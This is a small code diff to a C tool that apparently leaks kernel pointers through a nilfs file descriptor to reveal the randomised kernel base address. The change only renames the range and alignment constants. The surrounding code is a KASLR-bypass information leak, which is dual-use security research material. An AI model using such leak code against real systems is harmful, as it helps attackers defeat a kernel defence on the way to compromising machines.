@@ -164,7 +164,7 @@ static unsigned long try_leak(int nilfs_fd) {
          off += sizeof(unsigned long)) {
       unsigned long val;
       memcpy(&val, entry + off, sizeof(val));
-      if (val >= KERNEL_TEXT_MIN && val <= KERNEL_TEXT_MAX) {
+      if (val >= KERNEL_VIRT_TEXT_MIN && val <= KERNEL_VIRT_TEXT_MAX) {
         addr = val;
         free(buf);
         return addr;
@@ -195,7 +195,7 @@ int main(void) {
     if (addr) {
       close(fd);
       printf("leaked possible kernel pointer: %lx\n", addr);
-      printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
+      printf("possible kernel base: %lx\n", addr & -KASLR_VIRT_ALIGN);
       kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, addr, NULL,
                           CONF_HEURISTIC);
       return 0;
